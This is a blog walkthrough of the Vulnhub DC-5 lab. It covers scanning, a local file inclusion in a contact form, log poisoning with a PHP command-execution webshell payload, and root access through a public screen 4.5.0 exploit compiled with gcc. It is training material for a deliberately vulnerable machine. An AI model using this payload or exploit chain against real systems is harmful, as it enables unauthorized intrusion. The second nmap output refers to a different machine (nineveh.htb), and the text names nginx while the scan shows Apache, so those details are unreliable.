---
"title": "Vulnhub - DC 5"
"date": 2019-11-19
"tags": ["easy", "lfi", "log-poisoning"]
"keywords": ["easy", "lfi", "log-poisoning"]
"categories": ["Vulnhub"]
"author": "Ghostbyt3"
"description": "Today, We are going to pwn DC 5 by DCAU7 from Vulnhub"
"featured_image": "/img/dc5/1.png"
"layout": "single"
"showTableOfContents": true
"authorbox": true
"pager": true
"toc": true
"mathjax": true
"sidebar": "right"
"subtitle": "Vulnhub - Writeup"
---


![Untitled](/img/dc5/1.png)
Today, We are going to pwn DC 5 by DCAU7 from Vulnhub


## Description
>DC-5 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.
The plan was for DC-5 to kick it up a notch, so this might not be  great for beginners, but should be ok for people with intermediate or  better experience. Time will tell (as will feedback).
As far as I am aware, there is only one exploitable entry point to  get in (there is no SSH either). This particular entry point may be  quite hard to identify, but it is there. You need to look for something a  little out of the ordinary (something that changes with a refresh of a  page). This will hopefully provide some kind of idea as to what the  vulnerability might involve.
And just for the record, there is no phpmailer exploit involved. :-)
The ultimate goal of this challenge is to get root and to read the one and only flag.
Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.
For beginners, Google can be of great assistance, but you can always  tweet me at @DCAU7 for assistance to get you going again. But take note:  I won't give you the answer, instead, I'll give you an idea about how  to move forward.
But if you're really, really stuck, you can watch this video which shows the first step.

Download link: [https://www.vulnhub.com/entry/dc-5,314/](https://www.vulnhub.com/entry/dc-5,314/)

Lets Begin with our Initial Scan

## Nmap Scan Results

```
PORT      STATE SERVICE
80/tcp    open  http
111/tcp   open  rpcbind
45669/tcp open  unknown
```

```
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
```

Looks like only HTTP port is open so lets start our Gobuster

## Gobuster Result
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.0.2.9
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/11/27 17:30:35 Starting gobuster
===============================================================
/css (Status: 301)
/images (Status: 301)
/index.php (Status: 200)
===============================================================
2019/11/27 17:30:36 Finished
===============================================================
```

Well gobuster didn’t find anything interesting.

Lets Check the webpage and nothing Interesting too.

![Untitled](/img/dc5/1.png)

But there is form in ``contact`` page.

![Untitled](/img/dc5/2.png)

So i filled some random datas and submitted

![Untitled](/img/dc5/3.png)

## Getting Shell

### Finding LFI

Once submitted it redirects to some new page with some kind of parameters. I think it is vulnerable to LFI (Local File Inclusion)
So lets test it.

![Untitled](/img/dc5/4.png)
Its Confirmed!!
Now all we need to do is get a reverse shell.

### LFI -> RCE
We know its running in nginx from nmap scans so we can do log poisoning.
For that we need to send a request

`` [?php system($_GET['cmd']); ](?php system($_GET['cmd']); )>``

Now its injected , we know log files of nginx located in ``/var/log/nginx/error.log``

![Untitled](/img/dc5/5.png)
For more info read this article:
>https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/

We got the shell

![Untitled](/img/dc5/6.png)

## Privilege Escalation

I uploaded my Linux Enumeration Script and found SETUID file

![Untitled](/img/dc5/7.png)

>screen 4.5.0

Searchsploit shows me an exploit available

![Untitled](/img/dc5/8.png)

> [https://www.exploit-db.com/exploits/41154](https://www.exploit-db.com/exploits/41154)

I uploaded the script to the machine and tried running but i faced some error , so i split them into 3 parts

![Untitled](/img/dc5/9.png)

And did the same commands

```
gcc -fPIC -shared -ldl -o exploit.so exploit.c
gcc -o rootshell rootshell.c
```
Now I uploaded them

![Untitled](/img/dc5/10.png)

Run 411.sh

![Untitled](/img/dc5/11.png)

We got Root 

``Flag`` [br/](br/)
![Untitled](/img/dc5/13.png)

